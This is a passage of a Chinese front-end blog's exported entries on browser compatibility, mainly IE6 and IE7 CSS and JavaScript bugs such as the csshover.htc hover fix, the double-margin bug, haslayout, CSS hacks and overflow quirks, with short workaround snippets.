    <content type="text"><![CDATA[&emsp;&emsp;在ie6 下只有a 才支持:hover 伪类，其它标签都不支持，现在可以通过 csshover.htc 可以解决 ie6 的 hover 兼容问题。&emsp;&emsp;它利用 javascript 脚本来给元素的的样式定义，如果检测到 hover 定义，就给元素设置 onmouseover 和 onmouseout 事件，以此来实现 hover 的效果。以下是 csshover.htc 代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;attach event="ondocumentready" handler="parseStylesheets"/&gt;&lt;script language="JScript"&gt;function parseStylesheets() &#123;for (var a = doc.styleSheets,b = a.length,c = 0; b &gt; c; c++) parseStylesheet(a[c])&#125;function parseStylesheet(a) &#123;if (a.imports) try &#123;for (var b = a.imports,c = b.length,d = 0; c &gt; d; d++) parseStylesheet(a.imports[d])&#125; catch(e) &#123;&#125;try &#123;for (var f = (currentSheet = a).rules, c = f.length, g = 0; c &gt; g; g++) parseCSSRule(f[g])&#125; catch(e) &#123;&#125;&#125;function parseCSSRule(a) &#123;var b = a.selectorText,c = a.style.cssText;if (/(^|\s)(([^a]([^ ]+)?)|(a([^#.][^ ]+)+)):(hover|active)/i.test(b) &amp;amp;&amp;amp; c) &#123;var d = b.replace(/[^:]+:([a-z-]+).*/i, "on$1"),e = b.replace(/(\.([a-z0-9_-]+):[a-z]+)|(:[a-z]+)/gi, ".$2" + d),f = /\.([a-z0-9_-]*on(hover|active))/i.exec(e)[1],g = b.replace(/:hover.*$/, ""),h = getElementsBySelect(g);currentSheet.addRule(e, c);for (var i = 0; i &lt; h.length; i++) new HoverElement(h[i], f, activators[d])&#125;&#125;function HoverElement(a, b, c) &#123;a.hovers || (a.hovers = &#123;&#125;),a.hovers[b] || (a.hovers[b] = !0, a.attachEvent(c.on,function() &#123;a.className += " " + b&#125;), a.attachEvent(c.off,function() &#123;a.className = a.className.replace(new RegExp("\\s+" + b, "g"), "")&#125;))&#125;function getElementsBySelect(a) &#123;var b, c = [doc];b = a.split(" ");for (var d = 0; d &lt; b.length; d++) c = getSelectedNodes(b[d], c);return c&#125;function getSelectedNodes(a, b) &#123;for (var c, d, e = [], f = /\.([a-z0-9_-]+)/i.exec(a), g = /\#([a-z0-9_-]+)/i.exec(a), h = a.replace(/(\.|\#|\:)[a-z0-9_-]+/i, ""), i = 0; i &lt; b.length; i++) &#123;c = h ? b[i].all.tags(h) : b[i].all;for (var j = 0; j &lt; c.length; j++) d = c[j],g &amp;amp;&amp;amp; d.id != g[1] || f &amp;amp;&amp;amp; !new RegExp("\\b" + f[1] + "\\b").exec(d.className) || (e[e.length] = d)&#125;return e&#125;var currentSheet, doc = window.document,activators = &#123;onhover: &#123;on: "onmouseover",off: "onmouseout"&#125;,onactive: &#123;on: "onmousedown",off: "onmouseup"&#125;&#125;;&lt;/script&gt;使用方法：1body&#123;behavior:url(css/csshover.htc);&#125;注意&emsp;&emsp;在引用 csshover.htc 时，不管你是在 css 文件里面引用 htc 文件，还是 html 里面引用 htc 文件，都是 html 文件去找 htc 的路径。也就是说路径一定要相对根目录或用绝对路径。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>ie6 hover</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6中文字溢出问题-多出文字]]></title>
    <url>%2F2015%2F07%2F13%2Fie6%E4%B8%AD%E6%96%87%E5%AD%97%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98-%E5%A4%9A%E5%87%BA%E6%96%87%E5%AD%97%2F</url>
    <content type="text"><![CDATA[页面代码：12345678910111213&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "[&lt;span style="color: black;"&gt;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html&lt;/span&gt;](http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd)&lt;span style="color: black;"&gt;xmlns="&lt;/span&gt;[&lt;span style="color: black;"&gt;http://www.w3.org/1999/xhtml&lt;/span&gt;](http://www.w3.org/1999/xhtml)&lt;span style="color: black;"&gt;"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;&lt;title&gt;多了一只猪&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="width:400px"&gt;&lt;div style="float:left"&gt;&lt;/div&gt;&lt;!-- --&gt;&lt;div style="float:right;width:400px"&gt;↓这就是多出来的那只猪&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;1.IE6的BUG经测试，只有IE6中有文字溢出bug,ie7 8火狐正常。2.与浮动有关去除中的“float:left;”，你会发现多出来的“猪”字不见了，页面正常显示。同样去除中的“float:right;”，多余的“猪”字也同样消失，页面正常显示。3.与注释“&lt;—-&gt;”的位置有关将注释转移到前面，多余的“猪”字消失，页面正常显示。将注释转移到↓这就是多出来的那只猪下面，多余的“猪”字也同样消失，页面正常显示。4.与固定宽度有关去除中的“width:400px”，多余的“猪”字消失，页面正常显示。5.溢出字数与注释条数有关增加注释的条数：当1条注释时，则多出来 1 个字；2 条注释时，则多出来 3 个字；3 条注释时，则多出来 5 个字……我们会从上面的规律中得到这样一个公式：溢出文字的字数=注释的条数 *2-1，这里的字数在中文或英文数字时都成立。当溢出的文字字数大于文本的字数时，文字区块将会消失。解决方法：a.不放置注释。最简单、最快捷的解决方法b.注释不要放置于 2 个浮动的区块之间c.将文字区块包含在新的 之间，如：↓这就是多出来的那只猪d.去除文字区块的固定宽度，与 3 有相似之处]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>IE6文字溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ie6 下文字和图片一起line-height失效的解决方法]]></title>
    <url>%2F2015%2F07%2F13%2Fie6-%E4%B8%8B%E6%96%87%E5%AD%97%E5%92%8C%E5%9B%BE%E7%89%87%E4%B8%80%E8%B5%B7line-height%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[BUG症状：当在一个容器里文字和img、input、textarea、select、object等元素相连的时候，对这个容器设置的line-height数值会失效；受影响的浏览器：Microsoft Internet Explorer 5.01 / WindowsMicrosoft Internet Explorer 5.5 / WindowsMicrosoft Internet Explorer 6解决方法：对和文字相连接的img、input、textarea、select、object等元素加以属性margin: (所属line-height-自身高度)/2px 0;vertical-align:middle]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>line-height失效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE、Firefox、Opera和Safari对CSS样式important和*的支持]]></title>
    <url>%2F2015%2F07%2F13%2Fie%E3%80%81firefox%E3%80%81opera%E5%92%8Csafari%E5%AF%B9css%E6%A0%B7%E5%BC%8Fimportant%E5%92%8C%E7%9A%84%E6%94%AF%E6%8C%81%2F</url>
    <content type="text"><![CDATA[1、IE6、IE7都支持 ，但IE8终于回归正统，放弃了对的支持2、IE7、IE8、Firefox、Opera、Safari都支持 important顾名，important的优先级要高. 举例说明：1234567body&#123;background-color:#FF0000 !important;*background-color:#00FF00 !important;*background-color:#0000FF;background-color:#000000;&#125;IE6选择最后一个，即：background-color:#000000;（因为IE6对important不感冒）IE7选择第二个，即：background-color:#000000;（因为IE7开始对important感冒了，同时还死守着它对感情的最后一版本，但important并未起到优先级的作用）IE8和Firefox、Opera、Safari选择第一个，即：background-color:#FF0000 !important;（IE8完全感冒于important，同时丢弃了对*的感情）另外再补充一个，下划线”_”,IE6支持下划线，IE7、IE8和Firefox、Opera、Safari均不支持下划线.]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>important</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[overflow-y:auto;属性在IE6下无效的终极解决方案]]></title>
    <url>%2F2015%2F07%2F13%2Foverflow-yauto%E5%B1%9E%E6%80%A7%E5%9C%A8ie6%E4%B8%8B%E6%97%A0%E6%95%88%E7%9A%84%E7%BB%88%E6%9E%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[今天在IE6下测试主题，发现凡是贴代码的文章页面都是代码框撑破了页面。我贴代码是手动用pre标签，再用主题集成的shjs来给代码着色的。因为我是在代码框定义时，在CSS中设置了水平滚动条“overflow-x:auto;”属性，这样代码太长宽度超过时会自动产生水平滚动条，但是这在IE6下失效了。在网上找了一些方法，最终解决了问题下面我来说明是如何解决的。一共是两种情况：第一种情况：在ul或者其他内联标签上添加over-y:auto;属性的时候，此时只需要添加属性：position:relative;在IE6下即正常。第二种个情况：在div或者块级标签上添加over-y:auto;属性的时候，此时有2种解决方法一种方法是在代码框的div的CSS定义中设置宽度，我定义的代码框是.code，我之前定义如下：.code{overflow-x:auto; margin:5px auto 8px;}后来附加设置了宽度，问题得以解决，如下：.code{overflow-x:auto; margin:5px auto 8px;width:95%;}另一种方法，将原来的.code的CSS定义修改如下：12345678.code&#123; word-wrap:break-word; word-break:break-all; overflow:auto; margin:5px auto 8px; &#125;/*前两个是在IE下单词内断行，然后其他浏览器自动产生水平滚动条*/这样，基于以上两种方法，该问题得到了解决。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>overflow-y:auto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[table和div设置height:100%无效的完美解决方法]]></title>
    <url>%2F2015%2F07%2F13%2Ftable%E5%92%8Cdiv%E8%AE%BE%E7%BD%AEheight100%E6%97%A0%E6%95%88%E7%9A%84%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[常出现这种情况：设置table和div的高height=”100%”无效，使用CSS来设置height:”100%”也无效，为什么会这样呢？解决height:100%无效，table和div的解决方法并不相同。首先说一下table，他比较容易解决，当我们使用Dreamweaver来制作网页，新建一张网页，通常在代码头部会有类似以下的代码：&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;没错，你猜对了，问题就出在这里，你试着把这短代码删除，然后再刷新一下网页，你就会看到所有table以你的设置height=”100%”的展示！这段代码是告诉浏览器你的网页是遵循什么标准的，如上面的“W3C”标准，删除掉一般是不影响的。下面说一下div，div和table一样，如果要实现width:100%是很容易的，但要div的height:”100%”，它就不大听话了，其实不是它不听话，是你不知道让它听话的方法。如下代码：12345678910&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;&lt;title&gt;测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="height:100%"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;就算和Table一样去掉头部的那段代码也不能100%显示，原因很简单，你让div的height=”100%”，执行网页时，css先执行到，而整个网页中的内容还没有完全载入，是获取不到div外面的&lt;body&gt;等的高度的，所以height=”100%”也就不能如愿显示了。加上body{height:100%}就轻松解决啦，一开始就让body以100%显示，他的下级div自然就100%的，不过对于FF浏览器还应该把HTML也先给height:100%，即html,body{height:100%}这样div就听话了]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>height:100%;</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js scrollTop在GOOGLE浏览器下不兼容问题]]></title>
    <url>%2F2015%2F07%2F13%2Fjs-scrolltop%E5%9C%A8google%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E4%B8%8D%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[解决方法1:1var top = document.body.scrollTop | document.documentElement.scrollTop;解决方法2:1234isCSS1 = /CSS1Compat/.test( document.compatMode ),isWebkit = /webkit/ig.test( navigator.userAgent ),wrap = isCSS1 &amp;amp;&amp;amp; !isWebkit ? document.documentElement : document.body,wrap.scrollTop....]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>scrolltop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[$('#a').focus()方法在google浏览器无效果]]></title>
    <url>%2F2015%2F07%2F13%2Fa-focus%E6%96%B9%E6%B3%95%E5%9C%A8google%E6%B5%8F%E8%A7%88%E5%99%A8%E6%97%A0%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[360浏览器把内核换成了google浏览器，本人感觉一方面大大降低了用户体验，第二方面就是换成google核心后很多网站都无法正常的兼容显示，就这两方面就有很多人都在吐槽着360浏览器，好了，不再吐槽他们了，正式进入我们的主题。123$('#a').focus(function()&#123;alert('弹出框');&#125;);就这么一个jquery简单的效果就不兼容于google，其解决方法很简单，无需要动它，因为它在配置环境中就可以正常运行了！]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>focus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6 Bug overflow:hidden失效]]></title>
    <url>%2F2015%2F07%2F13%2Fie6-bug-overflowhidden%E5%A4%B1%E6%95%88%2F</url>
    <content type="text"><![CDATA[bug内容：当父元素的直接子元素或者下级子元素的样式拥有position:relative属性时，父元素的overflow:hidden属性就会失效。解决方法：在父元素中使用position:relative;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>overflow:hidden</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各浏览器input输入框中的光标高度显示不一致]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%90%84%E6%B5%8F%E8%A7%88%E5%99%A8input%E8%BE%93%E5%85%A5%E6%A1%86%E4%B8%AD%E7%9A%84%E5%85%89%E6%A0%87%E9%AB%98%E5%BA%A6%E6%98%BE%E7%A4%BA%E4%B8%8D%E4%B8%80%E8%87%B4%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;input输入框用一个背景图模拟，设置height和line-height一样的高度，使里面的输入文字能够居中，&emsp;&emsp;在FF下出现的情况是：点击input时，输入光标其实上跟input的height一样高，但当开始输入文字时，光标又变得跟文字一样高， chrome下光标跟input的height一样高， 而IE下光标跟文字的大小一致。 一直没弄明白为什么这样子，今天经过团队讨论，才知道原因所在。&emsp;&emsp;初步结论如下：IE：不管该行有没有文字，光标高度与font-size一致。FF：该行有文字时，光标高度与font-size一致。该行无文字时，光标高度与input的height一致。Chrome：该行无文字时，光标高度与line-height一致；该行有文字时，光标高度从input顶部到文字底部(这两种情况都是在有设定line-height的时候)，如果没有line-height，则是与font-size一致。 解决的方案： 给input的height设定一个较小的高度，然后用padding去填充，基本上可以解决所有浏览器的问题12345input&#123;height: 16px;padding: 4px 0px;font-size: 12px;&#125;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>input高度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端开发浏览器兼容探索]]></title>
    <url>%2F2015%2F07%2F13%2Fweb%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%8E%A2%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[前言浏览器兼容是前端开发人员必须掌握的一个技能，但是初入前端的同学或者其他后台web开发同学往往容易选择忽略，而形成两个极端：1. 我最开始都是使用IE6，IE6上没问题，其它浏览器坑爹（多出现与前端后端一起搞的同学，小生2年前就这种状态，鼓励人家用ie6.。。。）2. 我要遵循标准，我只要ff就好，IE就是坑爹的玩意，我不必去理他（小生一年前的心态。。。）现在看来，之前的想法都是不对的，我们诚然应该追求最新的浏览器使用最新的技术，但是渐进增强，向后兼容的思想一定要有，因为就现在IE6在中国的份额也是不容小视的。抛开之前的大道理，我们说点实际的问题，哪次前端面试不问兼容性问题？哪次我们又能回答的很好？反正我就没一次说好的，知不足然后能改，我前段时间便经过整理形成这篇文章，文章有很多不足，希望各位指正、补充，后面若是能形成一篇较全面的前端兼容文章就善莫大焉了！为什么会有兼容问题？由于市场上浏览器种类众多，而不同浏览器其内核亦不尽相同，所以各个浏览器对网页的解析就有一定出入，这也是导致浏览器兼容问题出现的主要原因，我们的网页需要在主流浏览器上正常运行，就需要做好浏览器兼容。使用Trident内核的浏览器：IE、Maxthon、TT；使用Gecko内核的浏览器：Netcape6及以上版本、FireFox；使用Presto内核的浏览器：Opera7及以上版本；使用Webkit内核的浏览器：Safari、Chrome。而我现在所说的兼容性问题，主要是说IE与几个主流浏览器如firefox，google等。而对IE浏览器来说，IE7又是个跨度，因为之前的版本更新甚慢，bug甚多。从IE8开始，IE浏览器渐渐遵循标准，到IE9后由于大家都一致认为标准很重要，可以说在兼容性上比较好了，但是在中国来说，由于xp的占有率问题，使用IE7以下的用户仍然很多，所以我们不得不考虑低版本浏览器的兼容。对浏览器兼容问题，我一般是这样分类的，HTML，Javascript兼容，CSS兼容。其中html相关问题比较容易处理，无非是高版本浏览器用了低版本浏览器无法识别的元素，导致其不能解析，所以平时注意一点就是。特别是HTML5增加了许多新标签，低版本浏览器有点影响时代进步啊；JavaScript兼容性问题在javascript中，各个浏览器基本语法差距不大，其兼容问题主要出现在各个浏览器的实现上，尤其对事件的支持有很大问题，在此我就说说我知道的几个问题。① 在标准的事件绑定中绑定事件的方法函数为 addEventListener,而IE使用的是attachEvent② 标准浏览器采用事件捕获的方式对应IE的事件冒泡机制（即标准由最外元素至最内元素或者IE由最内元素到最外元素）最后标准方亦觉得IE这方面的比较合理，所以便将事件冒泡纳入了标准，这也是addEventListener第三个参数的由来，而且事件冒泡作为了默认值。③ 事件处理中非常有用的event属性获得亦不相同，标准浏览器是作为参数带人，而ie是window.event方式获得，获得目标元素ie为e.srcElement 标准浏览器为e.target④ 然后在ie中是不能操作tr的innerHtml的⑤ 然后ie日期函数处理与其它浏览器不大一致，比如： var year= new Date().getYear(); 在IE中会获得当前年，但是在firefox中则会获得当前年与1900的差值。⑥获得DOM节点的方法有所差异，其获得子节点方法不一致。IE：parentElement parentElement.childrenFirefox：parentNode parentNode.childNodeschildNodes的下标的含义在IE和Firefox中不同，Firefox使用DOM规范，childNodes中会插入空白文本节点。一般可以通过node.getElementsByTagName()来回避这个问题。当html中节点缺失时，IE和Firefox对parentNode的解释不同。例如:IE：input.parentNode的值为空节点Firefox：input.parentNode的值为form解决方法：Firefox中节点没有removeNode方法，必须使用如下方法 node.parentNode.removeChild(node)⑦ 关于AJAX的实现上亦有所不同；就javascript来说，各大浏览器之间的差异还是不少的，但是具体我变得这里都不大关注了，因为我们开发过程中一般都会使用类库，若是不使用，都会自己积累形成一个类库，所以就js而言，兼容性问题基本解决了。让人头疼的CSS兼容因为之前对css的理解不够深入，也没有经过系统的学习，所以一度认为css是前端最难的东西，但真的学习后，才发现css真的很难。。。有很多东西啊！！！我觉得最让人头疼的问题还是CSS问题，因为一点点布局上的bug，可能导致整个页面的错位，在用户看来这是极不专业的。现在我就简要说说我对CSS兼容问题的认识： 先说点Hack的知识（真正的高手是不用Hack的，但要成为高手必须通过Hack这一关）&nbsp;123456789101112131415161718192021/* CSS属性级Hack */color:red; /* 所有浏览器可识别*/_color:red; /* 仅IE6 识别 */*color:red; /* IE6、IE7 识别 */+color:red; /* IE6、IE7 识别 */*+color:red; /* IE6、IE7 识别 */[color:red; /* IE6、IE7 识别 */color:red\9; /* IE6、IE7、IE8、IE9 识别 */color:red\0; /* IE8、IE9 识别*/color:red\9\0; /* 仅IE9识别 */color:red \0; /* 仅IE9识别 */color:red!important; /* IE6 不识别!important 有危险*//* CSS选择符级Hack */*html #demo &#123; color:red;&#125; /* 仅IE6 识别 */*+html #demo &#123; color:red;&#125; /* 仅IE7 识别 */body:nth-of-type(1) #demo &#123; color:red;&#125; /* IE9+、FF3.5+、Chrome、Safari、Opera 可以识别 */head:first-child+body #demo &#123; color:red; &#125; /* IE7+、FF、Chrome、Safari、Opera 可以识别 */:root #demo &#123; color:red\9; &#125; : /* 仅IE9识别 *//* IE条件注释Hack */&lt;!--[if IE 6]&gt;此处内容只有IE6.0可见&lt;![endif]--&gt;&lt;!--[if IE 7]&gt;此处内容只有IE7.0可见&lt;![endif]--&gt;接下来说说一些我知道的BUG：① css盒模型在IE6下解析有问题，我们知道就width来说，一个块级元素的magin、padding、boder，width7个属性的宽度之和，应该等于其父级元素的内容区域（width），而我们一般设置宽度若是未达到其长度，浏览器就会重置margin-right的值，将之它们的和等于其值，当然若是我们为margin设置负值，那么元素的width可能超出其父元素。在标准下，width为padding所占区域，但是再ie6中设置width后，其真实width为所设width-其padding与border*2，我一般采用CSShack技术处理② IE6的双倍边距BUG，在块级元素浮动后本来外边距10px,但IE解释为20px,解决办法是加上display: inline ，1、问题：在IE6下如果某个标签使用了float属性，同时设置了其外补丁“margin:10px 0 0 10px”可以看出，上边距和左边距同样为10px，但第一个对象距左边有20px。2、解决办法：当将其display属性设置为inline时问题就都解决了。3、说明：这是因为块级对象默认的display属性值是block，当设置了浮动的同时，还设置了它的外边距 就会出现这种情况。也许你会问：“为什么第二个对象和第一个对象之间就不存在双倍边距的BUG”？因为浮动都有其相对应的对象，只有相对于其父对象的浮动 对象才会出现这样的问题。第一个对象是相对父对象的，而第二个对象是相对第一个对象的，所以第二个对象在设置后不会出现问题。另外在一些特殊布局中，可能需要组合使用display:block;和display:inline;才能达到预期效果。当然最坏的情况下，我们就可以使用”margin:10px 0 0 10px;margin:10px 0 0 10px;_margin:10px 0 0 5px”，这种“标准属性;IE7识别属性;_IE6识别属性”HACK方式解决4、总结：这个现象仅当块级对象设置了浮动属性后才会出现，内联对象（行级对象）不会出现此问题。并且只有设置左边距和右边距的值才会出问题，上下边距不会出现问题。margin双布局可以说是IE6下经典的bug之一。产生的条件是：block元素+浮动+margin。还记得我自认为会css的那个阶段，这个问题我经常碰到，会很熟练的用hack解决这个问题，当时还自以为是，洋洋得意。现在看来，当时的自己嫩的就像个 豆芽菜。真正css厉害的人基本上是不会碰到这个bug的，如果您时不时遇到这个bug，说明您的css还有好一段路要走。我的体会是越少的浮动，就会越少的代码，会有更灵活的页面，会有扩展性更强的页面。这不多说，归结为到一定水平了，浮动会用的较少。另外，您也会避免使用浮动+margin的用法。所以，越后来越不易遇到这种bug。这里提一下解决方法，使用hack我是不推荐的，使用hack属于比初学者稍高一点的层次水平。一个页面，没有一个hack，但是各个浏览器下表现一致，这才是水平。使用display:inline;可以解决这个问题。而为什么display:inline可以解决这个双边距bug，首先是inline元素或inline-block元素是不存在双边距问题的。然后，float:left等浮动属性可以让inline元素haslayout，会让inline元素表现得跟inline-block元素的特性一样， 支持高宽，垂直margin和padding等，所以div class的所有样式可以用在这个display inline的元素上。③ IE6下图片下方有空隙产生；解决这个BUG的方法也有很多,可以是改变html的排版,或者设置img 为display:block，或者设置vertical-align 属性为vertical-align:top bottom middle text-bottom都可以解决.（但是最近我发现这个问题在其它浏览器中也有所体现）④ IE6 3px bug 两个浮动层中间有间隙，这个IE的3PX BUG也是经常出现的,解决的办法是给右边元素也同样浮动 float:left 或者相对IE6定义.left margin-right:-3px;经典两列布局，float: left;width:200px; 第二个，margin-left,200px; 他们之间会产生3px的间距。⑤ 在IE6中没有min-width的概念，其默认width就是min-width，所以有时字体过多它会选择撑开容器。⑥ IE6无法定义1px左右高度的容器，是因为默认的行高造成的,解决的方法也有很多, 例如: overflow:hidden zoom:0.08 line-height:1px⑦ 使用margin ： 0 auto；方法使容器居中依然在IE6中行不通，我们要对其父容器使用⑧ 被点击访问过的超链接样式不在具有hover和active了,很多人应该都遇到过这个问题,解决方法是改变CSS属性的排列顺序: L-V-H-A a:link {} a:visited {} a:hover {} a:active {}⑨ 在使用绝对定位相对定位时，设置z-index在ie中可能会失效，是因为其元素依赖于其父元素的z-index，而父元素默认为0 ？所以子元素z-index高，而父元素底，依然不会改变其显示顺序；10、外边距叠加问题：#box{ margin:10px; background-color:Red; }#box p { margin:20px; background:gray; }该代码会导致外边距叠加，并且外边距跑到div包裹外去，bug是由于块级子元素高度计算方式造成的。若是元素没有垂直边框或者padding，那么它的高度就是包含的子元素的顶部和底部边框的的距离。&nbsp;以上便是我所记得的一些bug，在这里我再顺带提一下haslayout（IE8废弃该属性）。在IE低版本浏览器时基本是表格布局的时代，几乎是所有的元素（除内联元素）都是一个盒子，内容不会超过表格的单元格，表格的单元格也不会超出表格。在IE6推出后，CSS改变这一假设——因为CSS允许内容超出元素。 因此haslayout这个属性就诞生了。在IE6，IE7中，每个元素都有haslayout这个属性，可以设置为 true 或者 false。如果设置为true，元素就必须去自我布局和渲染，因此元素会扩展去包含它溢出的内容，例如浮动或没截断的单词。如果haslayout 没有被设置成true，那么元素需依靠某个祖先元素来渲染它。这就是很多的ie bugs诞生的地方。IE浏览器下的很多bug都是haslayout = false 引起的，layout元素有以下特点：拥有布局（haslayout=true）元素不会收缩，所以可能会发生文字截断、消失的现象；布局元素对浮动自动清理；相对定位的元素没有布局，这可能导致绝对元素定位偏差；拥有布局的元素外边距不叠加；滚动时，页面会有所跳动；边框消失像素偏差haslayout不是一个CSS属性，所以我们不能这样的来设置它 haslayout:true;一个元素被设置成haslayout：true将被渲染成一个 having haslayout，反之同理。 一些元素本身该属性为true，若是需要触发，最好的方法是设置其zoom属性； 哪些元素本身就 haslayout：&lt;html&gt;, &lt;body&gt;&lt;table&gt;, &lt;tr&gt;, &lt;th&gt;, &lt;td&gt;&lt;iframe&gt;, &lt;embed&gt; (non-standard element),&lt;object&gt;, &lt;applet&gt; &lt;img&gt;&lt;hr&gt;&lt;input&gt;, &lt;button&gt;, &lt;select&gt;, &lt;textarea&gt;, &lt;fieldset&gt;, &lt;legend&gt;zoom:1，被认为是最好的触发Layout的方法，因为它对当前元素没有影响。 触发haslayout，相对来说比haslayout=false要简单。以下属性和值将给定一个元素进行布局position: absolutefloat:left or rightdisplay:inline-block；width:any value other than auto;height:any value other than auto；zoom: any value other than normal(*)；writing-mode: tb-rl最后，因为各个浏览器对一些元素的默认值设置不一致也会导致表现差异，比如浏览器默认字体，默认行高，默认间距等。所以我们一般会为几个主要元素设置默认值。结语以上便是我对浏览器兼容的简单认识，但是还是有很多不足的地方，由于技术所限，这里提出来和各位高手交流，希望在交流学习中和以后工作中积累相关经验，做出满足主流浏览器的网页。&nbsp;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>前端兼容</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6,IE7下设置body{overflow:hidden;}失效]]></title>
    <url>%2F2015%2F07%2F13%2Fie6ie7%E4%B8%8B%E8%AE%BE%E7%BD%AEbodyoverflowhidden%E5%A4%B1%E6%95%88%2F</url>
    <content type="text"><![CDATA[最近做项目发现在IE7下设置body{overflow:hidden;}后还是会出现纵向滚动条，所以上网查查了，在这里记录一下：设置body{overflow:hidden;}：IE6 IE7下不生效。IE6下横向纵向滚动条都在，IE7下纵向滚动条还在；分析原因：chrome、firefox会初始付值给html{overflow:visible;}IE6 初始付值html{overflow-x:auto;overflow-y:scroll;}IE7 初始付值html{overflow-x:visible;overflow-y:scroll;}只有dom根结点（也就是html根节点）设置html{overflow:visible;}的时候，浏览器才会将body元素中的overflow值应用到视图区。举个例子说：设置了body{overflow:hidden}，还会出现滚动条，不过这个滚动条不是body的，是html的，只有你设置html{overflow:visible;}body{overflow}的值才能传递到html{}中去。这样html的值就变成了{overflow:hidden}，ok没有滚动条了。这样就很明了啦，并不是bug，而是浏览器初始值不同产生的问题。所以上面的问题就是通过设置html的overflow的值来解决IE6和IE7下的存在的这个问题；总结：1.IE6.7下overflow:hidden对其下的绝对层position:absolute或者相对层position:relative无效。解决方案：给overflow:hidden加position:relative或者position:absolute。另，IE6支持overflow-x或者overflow-y的特性，IE7、Firefox不支持。2.IE6.7下，overflow:hidden所在容器必须固定高度，宽度最简洁的方法： 设置html,body{overflow:hidden;}]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>overflow:hidden</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE下javascript的各种错误与js兼容问题]]></title>
    <url>%2F2015%2F07%2F13%2Fie%E4%B8%8Bjavascript%E7%9A%84%E5%90%84%E7%A7%8D%E9%94%99%E8%AF%AF%E4%B8%8Ejs%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ie6下会出现一些很奇怪的错误比如：1、使用关键词fields,class等关键词做变量或者属性名会出现语法错误，可以加上单引号{‘class’,1}2、在object里多加了逗号也会出错，var obj={a:0;b:1,}//错误3、ie规定了一些只读元素类似table,dl等，如果在其内部添加其他元素会出现”未指明的错误”4、ie6下的document.getElementById会匹配name属性5、父元素使用了滤镜filter:AlphaImageLoader不仅子元素中的input、a等不能正常使用，而且子元素的mouseover、mousedown等事件也不会触发。6、flash as3中使用flash.external.ExternalInterface.call调用js的时候，如果flash没有给定id则会出现 ‘null’为空或不是对象 //document.getElementById(“”).SetReturnValue(flashtoXML()))7、ie6或ie7中直接用appendChild或者innerHTML改变table内容会导致表格不显示（但内容确实添加）或出错，解决方法是添加tbody元素。8、ie6 substr不支持负数9、ie中form.elements如果不给下标或键值 它等于form本身，因此不能使用for in来遍历10、win7中ietester不支持滤镜，当使用js改变fliter属性时会出现”不支持此接口”错误]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>js兼容</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6,IE7下使用appendChild向页面添加TABLE元素时失效的解决办法]]></title>
